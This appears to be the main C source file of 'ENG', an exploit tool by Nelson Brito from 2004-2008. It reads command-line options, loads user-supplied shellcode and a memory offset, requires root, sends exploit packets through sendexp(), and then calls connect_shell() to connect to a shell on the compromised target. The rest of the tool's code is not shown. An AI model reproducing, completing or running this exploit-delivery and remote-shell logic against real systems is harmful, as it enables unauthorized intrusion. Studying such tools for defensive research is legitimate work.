/* Copyright© 2004-2008 Nelson Brito
 * This file is part of the ENG Private Tool by Nelson Brito.

   This program is free software; you can redistribute it and/or modify it under
   the terms of the GNU General Public License  version 2, 1991  as published by
   the Free Software Foundation.

   This program is distributed  in the hope that it will be useful,  but WITHOUT
   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
   FOR A PARTICULAR PURPOSE.  
   
   See the GNU General Public License for more details.

   A copy of the GNU General Public License can be found at:
   http://www.gnu.org/licenses/gpl.html
   or you can write to:
   Free Software Foundation, Inc.
   59 Temple Place - Suite 330
   Boston, MA  02111-1307
   USA. */
#ifndef ENG_C__
#define ENG_C__ 1
/* Nelson Brito <nbrito@sekure.org>
   $Id: eng.c,v 1.8 2008-09-14 17:57:14-03 nbrito Exp $ */
#include "eng.h"
#include "options.h"

/* This is main function which calls other routines. */
int main(int argc, char **argv){
#ifdef  __HAVE_LYRICS__
	register  int32_t tmprnd;/* temporary random variable     */
#endif  /* __HAVE_LYRICS__ */
	struct    options options; /* structure to hold the options */
	struct    shellcode shellcode; /* structure to hold the shellcode */
	struct    offset  offset;  /* struct to hold the offset     */

	/* Getting CLI options. */
	options = process_options(argc, argv);

	/* Processing shellcode structure. */
	shellcode = process_shellcode(options.shellcode, PROCESS_USER_SHELLCODE);

	/* Processing offset structure. */
	offset  = process_offset(options.offset, offset);
	
	/* Printing little banner. */
	printf("%s v%s.%s [built on %s %s]\n", program, __MAJOR_VERSION, __MINOR_VERSION, __DATE__, __TIME__);

#ifndef __CYGWIN__
        /* Warning missed privileges. */
	if(getuid()){
		printf("you must have privileges to run the %s\n", program);
		exit(EXIT_FAILURE);
	}
#endif  /* __CYGWIN__ */

	/* Sending packets. */
	if((sendexp(options, shellcode, offset)) < 0)
		exit(EXIT_FAILURE);

#ifdef __HAVE_LYRICS__

	/* Just for fun. ;-) */
	tmprnd = 1 + (int32_t) (3.0 * rand() / (RAND_MAX - 1.0));
	tmprnd--;

	nb(lyrics[tmprnd], 31337);

#else  /* __HAVE_LYRICS__ */

	nb(banner, 31337);

#endif /* __HAVE_LYRICS__ */

	nb(done, 31337);

	if(shellcode.position){
		nb(warning, 31337);
		/* Connecting to shell. */
		if(connect_shell(options) <= 0)
			exit(EXIT_FAILURE);
	}

	return(EXIT_SUCCESS);
}
#endif  /* ENG_C__ */
